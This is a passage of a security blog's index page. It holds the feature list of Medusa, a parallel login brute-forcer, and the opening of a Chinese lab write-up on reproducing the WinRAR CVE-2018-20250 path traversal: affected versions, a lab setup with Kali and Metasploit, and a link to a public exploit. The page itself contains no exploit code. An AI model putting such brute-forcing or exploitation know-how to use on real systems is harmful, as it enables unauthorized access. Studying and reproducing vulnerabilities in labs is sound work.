<p>Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application:</p>
<ul>
<li>Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently.</li>
<li>Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing.</li>
<li>Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing.</li>
<li>Multiple protocols supported. Many services are currently supported (e.g. SMB,  HTTP, POP3,  MS-SQL, SSHv2, among others).</li>
<li><strong>Application stability.</strong> Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways.</li>
</ul>
</blockquote>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/18/Brief-Introduction-on-Medusa&Hydra/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/15/Writeup-on-CVE-2018-20250/" class="post-title-link" itemprop="url">'WinRAR目录穿越漏洞复现（CVE-2018-20250）'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-15 19:25:33" itemprop="dateCreated datePublished" datetime="2019-03-15T19:25:33+08:00">2019-03-15</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-漏洞细节"><a href="#1-漏洞细节" class="headerlink" title="1.漏洞细节"></a>1.漏洞细节</h1><blockquote>
<p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>
</blockquote>
<h1 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2.漏洞影响版本"></a>2.漏洞影响版本</h1><blockquote>
<p>WinRAR &lt; 5.70 Beta 1</p>
<p>Bandizip &lt; = 6.2.0.0</p>
<p>好压(2345压缩) &lt; = 5.9.8.10907</p>
<p>360压缩 &lt; = 4.0.0.1170</p>
</blockquote>
<h1 id="3-漏洞复现环境"><a href="#3-漏洞复现环境" class="headerlink" title="3.漏洞复现环境"></a>3.漏洞复现环境</h1><table>
<thead>
<tr>
<th style="text-align:center">角色</th>
<th style="text-align:center">系统版本</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">靶机</td>
<td style="text-align:center">Windows7（64bit）</td>
<td style="text-align:center">192.168.126.128</td>
<td style="text-align:center">安装WinRAR版本为5.6.1，关闭防火墙</td>
</tr>
<tr>
<td style="text-align:center">攻击机</td>
<td style="text-align:center">Kali Linux 64 Bit <strong>2019.1a</strong></td>
<td style="text-align:center">192.168.126.126</td>
<td style="text-align:center">Metasploit版本为5.0.2</td>
</tr>
<tr>
<td style="text-align:center">攻击机</td>
<td style="text-align:center">WIndows10（64bit）</td>
<td style="text-align:center"></td>
<td style="text-align:center">安装Python3.7.2</td>
</tr>
</tbody>
</table>
<p>exp下载：<a href="https://github.com/WyAtu/CVE-2018-20250/" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250/</a></p>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/15/Writeup-on-CVE-2018-20250/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">chessur</p>
              <div class="site-description motion-element" itemprop="description"></div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">11</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">2</span>
                    <span class="site-state-item-name">tags</span>
                  
                </div>
              
            </nav>
          

          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/ChireC" title="GitHub &rarr; https://github.com/ChireC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
            </div>
          

          

          
          

          
            
          
          

        </div>
      </div>

      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chessur</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.0.1</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>
























  



  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script src="/lib/reading_progress/reading_progress.js"></script>


  


  <script src="/js/src/utils.js?v=7.0.1"></script>

  <script src="/js/src/motion.js?v=7.0.1"></script>



  
  


  <script src="/js/src/affix.js?v=7.0.1"></script>

  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>




  

  


  <script src="/js/src/next-boot.js?v=7.0.1"></script>


  

  

  

  



  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
